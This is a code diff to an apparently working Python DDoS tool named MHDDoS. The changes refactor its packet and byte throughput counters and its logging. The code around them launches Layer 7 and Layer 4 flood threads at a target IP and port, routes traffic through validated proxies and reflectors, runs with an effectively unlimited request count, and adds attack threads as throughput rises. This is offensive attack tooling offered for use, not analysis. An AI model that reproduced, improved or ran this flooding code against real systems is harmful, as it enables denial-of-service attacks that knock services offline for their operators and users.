@@ -33,9 +33,14 @@ basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
 logger = getLogger("MHDDoS")
 logger.setLevel("INFO")
 
-__version__: str = "2.3 SNAPSHOT"
+__version__: str = "PALYANYTSYA"
 __dir__: Path = Path(__file__).parent
 bombardier_path: str = ""
+
+
+UNLIMITED_RPC = 1000000000000  # number of requests per connection used to make the attack "unlimited" by time
+CONNECTIVITY_CHECK_INTERVAL = 60  # TODO: make this a parameter of attack()?
+PROXIES_CHECK_INTERVAL = 120  # TODO: make this a parameter of attack()?
 
 
 def exit(*message):
@@ -68,9 +73,32 @@ class AttackState:
     time_since_last_packet_sent: float = None
 
 
-UNLIMITED_RPC = 1000000000000  # number of requests per connection used to make the attack "unlimited" by time
-CONNECTIVITY_CHECK_INTERVAL = 60
-PROXIES_CHECK_INTERVAL = 120
+last_counters_update_time = 0
+
+
+def update_throughput_counters(rolling_packets_counter: Counter,
+                               total_packets_counter: Counter,
+                               rolling_bytes_counter: Counter,
+                               total_bytes_counter: Counter) -> (float, float, float, float):
+    global last_counters_update_time
+    time_since_last_update = time.perf_counter() - last_counters_update_time
+    last_counters_update_time = time.perf_counter()
+
+    # update total request counts
+    total_packets_counter += int(rolling_packets_counter)
+    total_bytes_counter += int(rolling_bytes_counter)
+
+    # save current stats
+    pps = int(rolling_packets_counter) / time_since_last_update if time_since_last_update > 0 else 0
+    bps = int(rolling_bytes_counter) / time_since_last_update if time_since_last_update > 0 else 0
+    tp = int(total_packets_counter)
+    tb = int(total_bytes_counter)
+
+    # reset rolling counters
+    rolling_packets_counter.set(0)
+    rolling_bytes_counter.set(0)
+
+    return pps, tp, bps, tb
 
 
 def attack(
@@ -145,10 +173,10 @@ def attack(
         selected_attack_method = attack_method
 
         if selected_attack_method in Methods.LAYER7_METHODS:
-            Layer7(target.url, target.ip, selected_attack_method, UNLIMITED_RPC, stop_event, user_agents, referrers, validated_proxies, BYTES_SENT, PACKETS_SENT).start()
+            Layer7(target.url, target.ip, selected_attack_method, UNLIMITED_RPC, stop_event, user_agents, referrers, validated_proxies, cntr_rolling_bytes, cntr_rolling_requests, cntr_last_request_timestamp).start()
         elif selected_attack_method in Methods.LAYER4_METHODS:
             selected_proxies = validated_proxies if selected_attack_method in Methods.WHICH_SUPPORT_PROXIES else None
-            Layer4((target.ip, target.port), reflectors, selected_attack_method, stop_event, selected_proxies, BYTES_SENT, PACKETS_SENT).start()
+            Layer4((target.ip, target.port), reflectors, selected_attack_method, stop_event, selected_proxies, cntr_rolling_bytes, cntr_rolling_requests, cntr_last_request_timestamp).start()
 
         thread_stop_events.append(stop_event)
         stop_event.set()
@@ -193,7 +221,7 @@ def attack(
             packets_per_second=pps,
             total_bytes_sent=tb,
             bytes_per_second=bps,
-            time_since_last_packet_sent=time.time() - float(LAST_REQUEST_TIMESTAMP),
+            time_since_last_packet_sent=time.time() - float(cntr_last_request_timestamp),
         )
         attack_state_queue.put(attack_status)
 
@@ -207,14 +235,12 @@ def attack(
         process.nice(19)
 
     # INITIALIZE COUNTERS
-    PACKETS_SENT = Counter()
-    BYTES_SENT = Counter()
-    TOTAL_PACKETS_SENT = Counter()
-    TOTAL_BYTES_SENT = Counter()
-    LAST_REQUEST_TIMESTAMP = Counter(value_type=ctypes.c_double)
-    global last_counters_update_time
-    last_counters_update_time = time.perf_counter()
-    pps, tp, bps, tb = update_counters(PACKETS_SENT, TOTAL_PACKETS_SENT, BYTES_SENT, TOTAL_BYTES_SENT)
+    cntr_rolling_requests = Counter()
+    cntr_rolling_bytes = Counter()
+    cntr_total_requests = Counter()
+    cntr_total_bytes = Counter()
+    cntr_last_request_timestamp = Counter(value_type=ctypes.c_double)
+    pps, tp, bps, tb = update_throughput_counters(cntr_rolling_requests, cntr_total_requests, cntr_rolling_bytes, cntr_total_bytes)
 
     # INITIALIZE STATE MONITORING VARIABLES
     cpu_usage = process.cpu_percent()
@@ -237,17 +263,19 @@ def attack(
         proxies_validator.start()
 
         while True:
+            time.sleep(0.1)
+
             proxies_validation_state: ProxiesValidationState = get_last_from_queue(proxies_validation_state_queue)
+
             if proxies_validation_state is not None:
+                logger.info(f"Waiting for initial proxy validation to complete ({proxies_validation_state.progress * 100:.0f}%)...")
+
                 if proxies_validation_state.is_validation_complete:
                     validated_proxies = proxies_validation_state.get_validated_proxies(proxies)
                     logger.info(f"Proxy validation completed. Found {proxies_validation_state.validated_proxies_count} valid proxies.")
                     if proxies_validation_state.validated_proxies_count == 0:
                         exit(f"Target cannot be reached through any of {len(proxies)} provided proxy servers. Attack will not be executed.")
                     break
-                else:
-                    logger.info(f"Waiting for initial proxy validation to complete ({proxies_validation_state.progress * 100}%)...")
-        time.sleep(1)
 
     # START CONNECTIVITY MONITOR THREAD
     connectivity_monitor = Thread(
@@ -265,6 +293,7 @@ def attack(
     while True:
         time.sleep(1)
 
+        tslr = time.time() - float(cntr_last_request_timestamp)
         cpu_usage = process.cpu_percent()
 
         # poll queues
@@ -273,11 +302,11 @@ def attack(
 
         # update counters
         previous_pps = pps
-        pps, tp, bps, tb = update_counters(PACKETS_SENT, TOTAL_PACKETS_SENT, BYTES_SENT, TOTAL_BYTES_SENT)
+        pps, tp, bps, tb = update_throughput_counters(cntr_rolling_requests, cntr_total_requests, cntr_rolling_bytes, cntr_total_bytes)
 
         ratio = pps / previous_pps if previous_pps > 0 else float("inf")
         THRESHOLD = 0.05
-        logger.info(f"{ratio} {ratio > 1 + THRESHOLD}")
+        # logger.info(f"{ratio} {ratio > 1 + THRESHOLD}")
         if ratio > 1 + THRESHOLD:  # TODO: use ratio
             increase_attack_threads()
         # elif ratio < 1:
@@ -292,40 +321,14 @@ def attack(
         # generate attack status
         post_status_update()
 
+        logger.warning(int(cntr_total_bytes))
         # log
         pps_string = Tools.humanformat(int(pps))
         bps_string = Tools.humanbytes(int(bps))
         tp_string = Tools.humanformat(int(tp))
         tb_string = Tools.humanbytes(int(tb))
-        logger.info(f"Total bytes sent: {tb_string}, total requests: {tp_string}, BPS: {bps_string}/s, PPS: {pps_string} p/s, active threads: {len(thread_stop_events)}, cpu: {cpu_usage}%")
-
-
-last_counters_update_time = 0
-
-
-def update_counters(rolling_packets_counter: Counter,
-                    total_packets_counter: Counter,
-                    rolling_bytes_counter: Counter,
-                    total_bytes_counter: Counter) -> (float, float, float, float):
-    global last_counters_update_time
-    time_since_last_update = time.perf_counter() - last_counters_update_time
-    last_counters_update_time = time.perf_counter()
-
-    # update total request counts
-    total_packets_counter += int(rolling_packets_counter)
-    total_bytes_counter += int(rolling_bytes_counter)
-
-    # save current stats
-    pps = int(rolling_packets_counter) / time_since_last_update if time_since_last_update > 0 else 0
-    bps = int(rolling_bytes_counter) / time_since_last_update if time_since_last_update > 0 else 0
-    tp = int(total_packets_counter)
-    tb = int(total_bytes_counter)
-
-    # reset rolling counters
-    rolling_packets_counter.set(0)
-    rolling_bytes_counter.set(0)
-
-    return pps, tp, bps, tb
+        logger.info(f"Total bytes sent: {tb_string}, total requests: {tp_string}, BPS: {bps_string}/s, PPS: {pps_string} p/s, tslr: {tslr*1000:.0f} ms "
+                    f"active threads: {len(thread_stop_events)}, cpu: {cpu_usage}%")
 
 
 def start():
